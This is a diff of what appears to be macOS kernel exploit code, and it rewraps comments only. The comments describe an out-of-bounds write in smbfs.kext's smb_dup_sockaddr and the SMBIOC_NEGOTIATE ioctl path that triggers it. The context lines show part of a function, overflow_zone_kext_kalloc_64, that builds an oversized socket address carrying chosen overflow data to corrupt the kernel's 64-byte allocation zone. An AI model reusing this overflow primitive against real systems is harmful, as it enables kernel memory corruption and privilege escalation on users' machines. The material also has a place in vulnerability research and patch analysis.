@@ -15,9 +15,9 @@
 
 
 ///
-/// The method `smb_dup_sockaddr` is used in `smbfs.kext` to duplicate a socket address. This method
-/// allocates a memory of size `sizeof(struct sockaddr_nb)` and type `M_SONAME` and copies `sa_len`
-/// bytes from socket address to allocated memory as shown below:
+/// The method `smb_dup_sockaddr` is used in `smbfs.kext` to duplicate a socket address. This
+/// method allocates a memory of size `sizeof(struct sockaddr_nb)` and type `M_SONAME` and
+/// copies `sa_len` bytes from socket address to allocated memory as shown below:
 ///
 /// struct sockaddr *
 /// smb_dup_sockaddr(struct sockaddr *sa, int canwait)
@@ -39,8 +39,8 @@
 ///    return (sa2);
 /// }
 ///
-/// As noted above in the code snippet, an OOB write in default.64 zone occurs when the length of
-/// input socket address (`sa_len`) is greater than 64.
+/// As noted above in the code snippet, an OOB write in default.64 zone occurs when the length
+/// of input socket address (`sa_len`) is greater than 64.
 ///
 ///
 
@@ -80,17 +80,18 @@ int overflow_zone_kext_kalloc_64(char* overflow_data, uint overflow_size) {
     input_sockaddr->sa_len = input_sockaddr_length;
     memcpy((char*)input_sockaddr + allocated_memory_size, overflow_data, overflow_size);
 
-    /// The ioctl requests for smb device is handled by `nsmb_dev_ioctl` method defined in `smb_dev.c`
-    /// This method will pass the `SMBIOC_NEGOTIATE` ioctl commands down to `smb_usr_negotiate`
-    /// method defined in `smb_usr.c` which will inturn pass it down to `smb_sm_negotiate` defined in
-    /// `smb_conn.c`
+    /// The ioctl requests for smb device is handled by `nsmb_dev_ioctl` method defined in
+    /// `smb_dev.c`. This method will pass the `SMBIOC_NEGOTIATE` ioctl commands down
+    /// to `smb_usr_negotiate` method defined in `smb_usr.c` which will inturn pass it down to
+    /// `smb_sm_negotiate` defined in `smb_conn.c`
     ///
-    /// The `smb_sm_negotiate` method will copy the input socket address from user memory to kernel
-    /// memory and without any validation pass the copied in socket address down to `smb_session_create`
-    /// method defined in `smb_conn.c`
+    /// The `smb_sm_negotiate` method will copy the input socket address from user memory
+    /// to kernel memory and without any validation pass the copied in socket address down to
+    /// `smb_session_create` method defined in `smb_conn.c`
     ///
-    /// The `smb_session_create` also does not perform any validation of input socket address and it will
-    /// call `smb_dup_sockaddr` to duplicate the input socket address, triggering the OOB write vulnerability
+    /// The `smb_session_create` also does not perform any validation of input socket address
+    /// and it will call `smb_dup_sockaddr` to duplicate the input socket address, triggering the
+    /// OOB write vulnerability
     struct smbioc_negotiate req;
     bzero(&req, sizeof(req));
     req.ioc_version = SMB_IOC_STRUCT_VERSION;
